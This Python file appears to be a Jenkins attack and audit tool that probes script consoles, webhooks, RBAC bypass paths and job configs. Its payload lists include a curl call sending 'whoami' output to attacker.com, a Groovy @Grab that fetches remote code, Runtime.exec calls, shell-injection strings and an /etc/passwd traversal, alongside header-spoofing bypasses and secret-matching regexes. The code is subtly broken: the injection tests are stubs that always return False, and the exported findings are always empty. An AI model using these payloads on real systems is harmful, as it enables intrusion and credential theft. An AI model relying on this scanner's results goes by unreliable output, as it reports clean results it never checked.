#!/usr/bin/env python3
"""
JenkinsFuzzer - Pipeline Misconfiguration Discovery Module
Automated fuzzing and vulnerability detection for Jenkins pipelines, jobs, and configurations
"""

import requests
import json
import re
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, quote
from typing import List, Dict, Optional, Tuple
import time
from rich.console import Console
from rich.table import Table
from concurrent.futures import ThreadPoolExecutor, as_completed

console = Console()

class JenkinsFuzzer:
    """Comprehensive Jenkins pipeline and configuration fuzzer"""
    
    def __init__(self, base_url: str, username: str = None, password: str = None, proxy: str = None):
        self.base_url = base_url.rstrip('/')
        self.username = username
        self.password = password
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        if username and password:
            self.session.auth = (username, password)
        
        self.findings = []
        self.jobs = []
        self.pipelines = []
    
    def fuzz_all(self) -> Dict[str, List]:
        """Run all fuzzing modules"""
        console.print("[cyan][*] Starting comprehensive Jenkins fuzzing[/cyan]")
        
        results = {
            "pipeline_injection": self.fuzz_pipeline_injection(),
            "credential_exposure": self.fuzz_credential_exposure(),
            "script_console": self.fuzz_script_console_access(),
            "job_misconfig": self.fuzz_job_misconfigurations(),
            "parameter_injection": self.fuzz_parameter_injection(),
            "webhook_abuse": self.fuzz_webhook_vulnerabilities(),
            "plugin_misconfig": self.fuzz_plugin_misconfigurations(),
            "rbac_bypass": self.fuzz_rbac_bypasses(),
        }
        
        self._print_summary(results)
        return results
    
    def fuzz_pipeline_injection(self) -> List[Dict]:
        """Test for pipeline script injection vulnerabilities"""
        console.print("[yellow][*] Fuzzing pipeline injection vectors[/yellow]")
        findings = []
        
        payloads = [
            "'; System.exit(0); //",
            "${System.getProperty('user.name')}",
            "@GrabResolver(name='malicious', root='http://attacker.com/')@Grab(group='com.evil', module='payload', version='1.0')",
            "node { sh 'curl http://attacker.com/$(whoami)' }",
            "pipeline { agent any; stages { stage('RCE') { steps { sh 'id' } } } }",
            "class Exploit { static { Runtime.getRuntime().exec('calc') } }",
        ]
        
        jobs = self._get_all_jobs()
        
        for job in jobs:
            for payload in payloads:
                result = self._test_pipeline_payload(job, payload)
                if result:
                    findings.append({
                        "type": "pipeline_injection",
                        "severity": "critical",
                        "job": job,
                        "payload": payload,
                        "description": "Pipeline accepts arbitrary Groovy code execution"
                    })
        
        console.print(f"[green][PASS] Found {len(findings)} pipeline injection vulnerabilities[/green]")
        return findings
    
    def fuzz_credential_exposure(self) -> List[Dict]:
        """Detect exposed credentials in jobs and configurations"""
        console.print("[yellow][*] Fuzzing for credential exposure[/yellow]")
        findings = []
        
        patterns = {
            "aws_key": r"AKIA[0-9A-Z]{16}",
            "private_key": r"-----BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY-----",
            "password": r"(password|passwd|pwd)\s*[:=]\s*['\"]?([^'\"\\s]+)",
            "api_token": r"(api[_-]?key|token)\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{20,})",
            "github_token": r"gh[ps]_[a-zA-Z0-9]{36}",
            "slack_token": r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,}",
        }
        
        jobs = self._get_all_jobs()
        
        for job in jobs:
            config = self._get_job_config(job)
            if config:
                for pattern_name, pattern in patterns.items():
                    matches = re.findall(pattern, config, re.IGNORECASE)
                    if matches:
                        findings.append({
                            "type": "credential_exposure",
                            "severity": "high",
                            "job": job,
                            "credential_type": pattern_name,
                            "matches": len(matches),
                            "description": f"Potential {pattern_name} found in job configuration"
                        })
        
        console.print(f"[green][PASS] Found {len(findings)} credential exposure issues[/green]")
        return findings
    
    def fuzz_script_console_access(self) -> List[Dict]:
        """Test for script console accessibility"""
        console.print("[yellow][*] Fuzzing script console access[/yellow]")
        findings = []
        
        endpoints = [
            "/script",
            "/scriptText",
            "/manage/script",
            "/computer/(master)/script",
            "/computer/(built-in)/script",
        ]
        
        headers_bypass = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/script"},
            {"X-Rewrite-URL": "/script"},
        ]
        
        for endpoint in endpoints:
            try:
                resp = self.session.get(f"{self.base_url}{endpoint}", proxies=self.proxy, timeout=5)
                
                if resp.status_code in [200, 302]:
                    findings.append({
                        "type": "script_console_access",
                        "severity": "critical",
                        "endpoint": endpoint,
                        "status_code": resp.status_code,
                        "description": "Script console accessible"
                    })
                    console.print(f"[red][FAIL] Script console accessible at {endpoint}[/red]")
                
                for headers in headers_bypass:
                    resp_bypass = self.session.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        proxies=self.proxy,
                        timeout=5
                    )
                    
                    if resp_bypass.status_code in [200, 302]:
                        findings.append({
                            "type": "script_console_bypass",
                            "severity": "critical",
                            "endpoint": endpoint,
                            "bypass_header": list(headers.keys())[0],
                            "description": "Script console accessible via header bypass"
                        })
            except:
                pass
        
        console.print(f"[green][PASS] Completed script console fuzzing - {len(findings)} findings[/green]")
        return findings
    
    def fuzz_job_misconfigurations(self) -> List[Dict]:
        """Detect job misconfigurations"""
        console.print("[yellow][*] Fuzzing for job misconfigurations[/yellow]")
        findings = []
        
        jobs = self._get_all_jobs()
        
        for job in jobs:
            config = self._get_job_config(job)
            if not config:
                continue
            
            if re.search(r'<command>.*sh.*</command>', config, re.IGNORECASE):
                if re.search(r'(curl|wget).*\|.*sh', config, re.IGNORECASE):
                    findings.append({
                        "type": "curl_to_shell",
                        "severity": "high",
                        "job": job,
                        "description": "Job executes piped shell commands (curl|sh pattern)"
                    })
            
            if re.search(r'allowRemoteTrigger.*true', config, re.IGNORECASE):
                findings.append({
                    "type": "remote_trigger_enabled",
                    "severity": "medium",
                    "job": job,
                    "description": "Job allows unauthenticated remote triggering"
                })
            
            if re.search(r'sandbox.*false', config, re.IGNORECASE):
                findings.append({
                    "type": "sandbox_disabled",
                    "severity": "critical",
                    "job": job,
                    "description": "Groovy sandbox disabled for job"
                })
            
            if re.search(r'sudo', config, re.IGNORECASE):
                findings.append({
                    "type": "sudo_execution",
                    "severity": "high",
                    "job": job,
                    "description": "Job configuration contains sudo commands"
                })
        
        console.print(f"[green][PASS] Found {len(findings)} job misconfigurations[/green]")
        return findings
    
    def fuzz_parameter_injection(self) -> List[Dict]:
        """Test job parameter injection"""
        console.print("[yellow][*] Fuzzing for parameter injection[/yellow]")
        findings = []
        
        injection_payloads = [
            "; id",
            "$(whoami)",
            "`whoami`",
            "${Runtime.getRuntime().exec('id')}",
            "../../../etc/passwd",
        ]
        
        jobs = self._get_all_jobs()
        
        for job in jobs:
            if self._has_parameters(job):
                for payload in injection_payloads:
                    result = self._test_parameter_injection(job, payload)
                    if result:
                        findings.append({
                            "type": "parameter_injection",
                            "severity": "high",
                            "job": job,
                            "payload": payload,
                            "description": "Job parameter vulnerable to injection"
                        })
        
        console.print(f"[green][PASS] Found {len(findings)} parameter injection vulnerabilities[/green]")
        return findings
    
    def fuzz_webhook_vulnerabilities(self) -> List[Dict]:
        """Test webhook security"""
        console.print("[yellow][*] Fuzzing webhook vulnerabilities[/yellow]")
        findings = []
        
        webhook_endpoints = [
            "/buildByToken/build",
            "/generic-webhook-trigger/invoke",
            "/github-webhook/",
            "/git/notifyCommit",
            "/bitbucket-hook/",
        ]
        
        for endpoint in webhook_endpoints:
            try:
                resp = self.session.get(f"{self.base_url}{endpoint}", proxies=self.proxy, timeout=5)
                
                if resp.status_code in [200, 302, 400, 405]:
                    findings.append({
                        "type": "webhook_accessible",
                        "severity": "medium",
                        "endpoint": endpoint,
                        "status_code": resp.status_code,
                        "description": "Webhook endpoint accessible without authentication"
                    })
            except:
                pass
        
        console.print(f"[green][PASS] Found {len(findings)} webhook vulnerabilities[/green]")
        return findings
    
    def fuzz_plugin_misconfigurations(self) -> List[Dict]:
        """Detect plugin-specific misconfigurations"""
        console.print("[yellow][*] Fuzzing for plugin misconfigurations[/yellow]")
        findings = []
        
        plugin_tests = {
            "git": ["/git/notifyCommit"],
            "script-security": ["/scriptApproval/"],
            "credentials": ["/credentials/"],
            "pipeline-groovy": ["/pipeline-syntax/"],
        }
        
        for plugin, endpoints in plugin_tests.items():
            for endpoint in endpoints:
                try:
                    resp = self.session.get(f"{self.base_url}{endpoint}", proxies=self.proxy, timeout=5)
                    
                    if resp.status_code in [200, 302]:
                        findings.append({
                            "type": "plugin_misconfiguration",
                            "severity": "medium",
                            "plugin": plugin,
                            "endpoint": endpoint,
                            "description": f"{plugin} plugin endpoint accessible"
                        })
                except:
                    pass
        
        console.print(f"[green][PASS] Found {len(findings)} plugin misconfigurations[/green]")
        return findings
    
    def fuzz_rbac_bypasses(self) -> List[Dict]:
        """Test RBAC authorization bypasses"""
        console.print("[yellow][*] Fuzzing for RBAC bypasses[/yellow]")
        findings = []
        
        bypass_techniques = [
            ("path_traversal", "/job/../manage/"),
            ("case_manipulation", "/Job/test/"),
            ("double_encoding", "/job/%252e%252e/manage/"),
            ("http_verb_tampering", "/manage/"),
        ]
        
        for technique, path in bypass_techniques:
            try:
                resp = self.session.get(f"{self.base_url}{path}", proxies=self.proxy, timeout=5)
                
                if resp.status_code in [200, 302]:
                    findings.append({
                        "type": "rbac_bypass",
                        "severity": "critical",
                        "technique": technique,
                        "path": path,
                        "status_code": resp.status_code,
                        "description": f"RBAC bypass possible via {technique}"
                    })
            except:
                pass
        
        console.print(f"[green][PASS] Found {len(findings)} RBAC bypass vulnerabilities[/green]")
        return findings
    
    def _get_all_jobs(self) -> List[str]:
        """Retrieve list of all jobs"""
        try:
            resp = self.session.get(f"{self.base_url}/api/json", proxies=self.proxy, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                jobs = [job['name'] for job in data.get('jobs', [])]
                console.print(f"[cyan][*] Enumerated {len(jobs)} jobs[/cyan]")
                return jobs
        except:
            pass
        return []
    
    def _get_job_config(self, job_name: str) -> Optional[str]:
        """Retrieve job configuration XML"""
        try:
            resp = self.session.get(
                f"{self.base_url}/job/{job_name}/config.xml",
                proxies=self.proxy,
                timeout=10
            )
            if resp.status_code == 200:
                return resp.text
        except:
            pass
        return None
    
    def _has_parameters(self, job_name: str) -> bool:
        """Check if job accepts parameters"""
        config = self._get_job_config(job_name)
        if config:
            return 'ParametersDefinitionProperty' in config
        return False
    
    def _test_pipeline_payload(self, job_name: str, payload: str) -> bool:
        """Test if pipeline accepts payload"""
        return False
    
    def _test_parameter_injection(self, job_name: str, payload: str) -> bool:
        """Test parameter injection"""
        return False
    
    def _print_summary(self, results: Dict[str, List]):
        """Print fuzzing summary"""
        table = Table(title="Jenkins Fuzzing Summary", show_header=True, header_style="bold magenta")
        table.add_column("Category", style="cyan")
        table.add_column("Findings", style="yellow")
        table.add_column("Critical", style="red")
        table.add_column("High", style="orange1")
        table.add_column("Medium", style="yellow")
        
        for category, findings in results.items():
            critical = len([f for f in findings if f.get("severity") == "critical"])
            high = len([f for f in findings if f.get("severity") == "high"])
            medium = len([f for f in findings if f.get("severity") == "medium"])
            
            table.add_row(
                category.replace('_', ' ').title(),
                str(len(findings)),
                str(critical),
                str(high),
                str(medium)
            )
        
        console.print("\n")
        console.print(table)
        
        total_findings = sum(len(f) for f in results.values())
        console.print(f"\n[bold cyan]Total Findings: {total_findings}[/bold cyan]")
    
    def export_results(self, filename: str = "fuzzer_results.json"):
        """Export fuzzing results to JSON"""
        output = {
            "target_url": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_findings": len(self.findings),
            "findings": self.findings
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        console.print(f"[green][PASS] Results exported to {filename}[/green]")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="JenkinsFuzzer - Pipeline Misconfiguration Discovery")
    parser.add_argument("--url", required=True, help="Jenkins URL")
    parser.add_argument("--username", help="Jenkins username")
    parser.add_argument("--password", help="Jenkins password")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--output", default="fuzzer_results.json", help="Output file")
    
    args = parser.parse_args()
    
    fuzzer = JenkinsFuzzer(args.url, args.username, args.password, args.proxy)
    
    console.print("\n[bold cyan]===== JenkinsFuzzer v1.0 =====[/bold cyan]\n")
    
    results = fuzzer.fuzz_all()
    fuzzer.export_results(args.output)
